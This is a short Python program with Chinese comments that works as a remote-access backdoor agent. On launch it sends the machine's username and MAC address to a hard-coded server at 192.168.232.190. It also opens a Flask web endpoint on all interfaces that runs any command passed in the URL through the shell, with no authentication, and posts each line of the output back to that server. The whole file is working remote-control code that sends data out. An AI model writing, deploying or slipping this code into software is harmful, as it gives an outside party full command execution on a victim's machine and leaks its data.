import getpass
import subprocess
import threading

import netifaces
import requests
from flask import Flask

app = Flask(__name__)


# 获取本机 MAC 地址
def get_mac_address():
    interfaces = netifaces.interfaces()
    for interface in interfaces:
        if interface == 'lo':  # 跳过本地回环接口
            continue
        mac = netifaces.ifaddresses(interface).get(netifaces.AF_LINK)
        if mac:
            return mac[0]['addr']
    return None


# 发送uid，mac
def pcinfo():
    # 获取当前用户的用户名
    username = getpass.getuser()
    uid = username
    mac = get_mac_address()
    info = {'UID': uid, 'MAC': mac}
    requests.post("http://192.168.232.190:90/save_info/", json=info)  # 发送JSON数据


# 客户端请求处理函数
@app.route('/cmd/<command>')
def cmd(command):
    screen_data = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

    while True:
        line = screen_data.stdout.readline()
        if line == b'':
            screen_data.stdout.close()
            break
        dem_stdout = line.decode('gbk').encode('utf-8')  # 解码和编码，以处理中文字符

        try:
            # print(dem_stdout)
            requests.post("http://192.168.232.190:90/result/", data={'result': dem_stdout})  # 发送结果至服务器
        except Exception as e:
            print(f"Error sending request: {e}")

    return str(dem_stdout)


# 启动 Flask 服务器
def run_server():
    app.run('0.0.0.0', 80, False)


# 主函数入口
if __name__ == '__main__':
    # 创建新线程运行 Flask 服务器
    server_thread = threading.Thread(target=run_server)
    server_thread.start()
    # 发送pcinfo
    pcinfo()
